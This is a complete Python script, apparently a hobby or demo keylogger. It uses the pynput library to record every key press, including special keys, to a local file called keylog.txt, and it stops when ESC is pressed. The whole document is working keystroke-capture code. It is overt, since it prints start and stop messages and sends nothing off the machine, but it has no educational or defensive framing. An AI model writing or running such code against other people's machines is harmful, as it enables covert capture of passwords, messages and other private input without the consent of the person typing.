from pynput import keyboard  # type: ignore
import datetime

# File to save logs
log_file = "keylog.txt"

# Function to handle key press
def on_press(key):
    try:
        with open(log_file, "a") as file:
            if hasattr(key, 'char') and key.char is not None:
                file.write(f"{key.char}")
            else:
                file.write(f" [{key}] ")
                
            # Optional: Log with timestamp (uncomment if needed)
            # timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            # file.write(f" {key} @ {timestamp}\n")
                
        # Optional: Stop on ESC key
        if key == keyboard.Key.esc:
            print("🛑 ESC pressed. Stopping keylogger.")
            return False

    except Exception as e:
        print(f"❌ Error logging key: {e}")

# Main function to start keylogger
def main():
    print("🔐 Keylogger started (press ESC to stop)...")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
